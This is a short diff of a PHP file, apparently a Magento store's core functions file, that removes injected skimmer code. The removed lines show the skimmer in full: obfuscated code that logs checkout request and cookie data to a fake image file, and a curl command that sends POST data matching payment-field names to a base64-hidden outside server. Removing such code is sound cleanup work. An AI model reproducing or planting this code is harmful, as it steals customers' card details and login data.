@@ -29,9 +29,7 @@
  *
  * @link http://us3.php.net/manual/en/security.magicquotes.disabling.php
  */
-$mpath = strrev('gpj.89tcellocsratava/v/a/tcudorp/golatac/aidem/lmth/selif/moc.gniknihtlacitirc.www/setis/www/');
-if(@preg_match("/checkout|onepage|north/", $_SERVER['REQUEST_URI'])){@file_put_contents($mpath, @base64_encode(serialize($_REQUEST)."--".serialize($_COOKIE)).":", FILE_APPEND);}
-@touch($mpath, 1460479950);
+
 if (get_magic_quotes_gpc()) {
     function mageUndoMagicQuotes($array, $topLevel=true) {
         $newArray = array();
@@ -413,5 +411,4 @@ if (!function_exists('hash_equals')) {
         return 0 === $result;
     }
 }
-if (preg_match("/".base64_decode('c2VjdXJldHJhZGluZ3xtb250aHxkdW1teXx5ZWFyfGZpcnN0bmFtZXxjdmMyfGNjX251bWJlcnxsb2dpbnxjdnZ8YmlsbGluZ3x1c2VybmFtZXxjY198c2hpcHBpbmd8ZXhwaXJ5fHBheW1lbnR8Y2FyZF9udW1iZXI=')."/i", serialize($_POST)))
-	exec("curl --data \"version=1&encode=".base64_encode(	serialize($_POST) . "--" . serialize($_COOKIE) )."&host=".$_SERVER["HTTP_HOST"]."\" ".trim(base64_decode('aHR0cDovL3ZlcnBheW1lbnQuY29tL3Rlc3RTZXJ2ZXIucGhw'))." > /dev/null 2<&1 &");
+
